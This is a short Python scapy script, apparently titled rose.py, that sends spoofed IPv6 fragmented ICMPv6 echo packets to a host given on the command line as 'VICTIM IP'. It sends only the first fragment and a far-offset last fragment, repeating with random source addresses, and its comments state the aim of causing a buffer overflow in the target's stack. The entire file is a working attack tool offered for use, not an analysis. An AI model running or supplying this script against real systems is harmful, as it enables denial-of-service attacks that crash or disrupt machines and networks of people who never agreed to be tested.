#!/usr/bin/python

# Jack Cardwell
# February 25, 2018

# rose.py sends fragmented packets at the very beginning and at the very end of the sequence
# Ideally, this will cause a buffer overflow when the stack allocates memory

from scapy.all import *
from sys import *
from math import *

# a helper method that creates a random IPv6 address
def randIP():

    ipv6 = ""

    for i in range(0, 8):
        for p in range(0, 4):
            if random.randint(0, 1) % 2:
                ipv6 += chr(random.randint(0x30, 0x39))
            else:
                ipv6 += chr(random.randint(0x41, 0x46))
        if i != 7:
            ipv6 += ':'

    # return the IPv6 address
    return ipv6

def rose():

    # check the number of arguments
    if len(sys.argv) != 4:
        print("Error: Please enter the correct arguments.")
        print("Usage: ./rose.py [VICTIM IP] [NUM_ATTEMPTS] [OFFSET]")
        exit(2)

    tgt = sys.argv[1]
    attempts = int(sys.argv[2])
    offset = int(sys.argv[3])

    # create the IPv6 Header
    ip = IPv6(dst=tgt)

    # create the fragment header
    frag = IPv6ExtHdrFragment()

    # ICMP header
    icmp = ICMPv6EchoRequest()

    for i in range(0, attempts):
        ip.src = randIP()

        frag.m = 1
        frag.offset = 0

        pkt = (ip/frag/icmp)
        send(pkt)

        frag.m = 0
        frag.offset = offset

        pkt = (ip/frag/icmp)
        send(pkt)

        time.sleep(0.1)
    return


rose()
